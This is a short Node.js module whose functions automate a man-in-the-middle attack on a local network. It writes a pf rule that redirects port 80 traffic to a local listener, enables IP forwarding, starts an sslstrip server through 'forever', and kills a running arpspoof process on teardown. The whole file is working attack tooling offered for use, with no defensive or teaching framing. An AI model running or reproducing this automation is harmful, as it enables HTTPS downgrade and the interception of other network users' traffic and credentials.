const child_process =  require('child_process');
const exec = child_process.exec;

exports.up = function(){
  enablePortForwarding()
  startSSLStripAttack()
}

exports.down = function(){
  stopSSLStripAttack()
  stopArpPoision()
}


function enablePortForwarding() {
  exec('echo "rdr pass inet proto tcp from any to any port 80 -> 10.0.1.8 port 8080" | sudo pfctl -ef -')
  exec('sudo sysctl -w net.inet.ip.forwarding=1')
  exec('sudo sysctl -w net.inet.ip.fw.enable=1')
}

function startSSLStripAttack(){
  console.log("Mounting SSLStrip Server");
  exec('forever start -c python ./bin/sslstrip/sslstrip.py -k -p')
}

function stopSSLStripAttack(){
  console.log("Unmounted SSLStrip Server");
  exec('forever stopall')
}

function stopArpPoision(){
  console.log("Stopping Arpspoof Attack")
  exec('pkill -9 arpspoof')
}
